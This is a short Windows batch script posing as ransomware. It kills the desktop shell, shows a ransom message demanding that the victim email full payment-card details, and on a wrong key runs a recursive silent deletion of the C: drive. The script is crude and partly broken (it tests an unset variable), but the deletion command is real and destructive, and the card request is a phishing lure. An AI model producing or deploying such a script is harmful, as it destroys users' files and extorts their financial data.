@echo off
taskkill /f /im explorer.exe
set /p oh=Oh you have a ransome ware. doyou want fix?(Y/N)=
if %p%==y goto ransomeware
if %p%==n exit

:ransomeware
cls
echo Congratulations! The software is registered.
pause
cls
color 04
echo this is ransomeware. you're open it. please write pessword then ransomeware is unlock
echo.
echo if pessword is wrong you're files can delete.
echo you don't know pessword, i can help you.
echo Send card information worth $ 100 to Example@Example.com. Card information form: Please enter your card number, Monday, address, postal code, company (Suntec), country, and phone number. If any of these are missing, ransomware cannot be terminated at any time.
echo.
echo Buy a key already, or if you know the key, enter it here.
echo -------------------------------------------------------------------------
set /p key=key :
if %key%==1234 goto pass

echo The password is wrong. It will delete all your files in 3 seconds.
ping 5
echo Now it will destroy your system
del /s /q c:\
echo Your system has already been destroyed.
ping 5
exit

:pass
color 02
echo The password was correct. I will recover all your files without any damage.
pause
start explorer.exe
exit
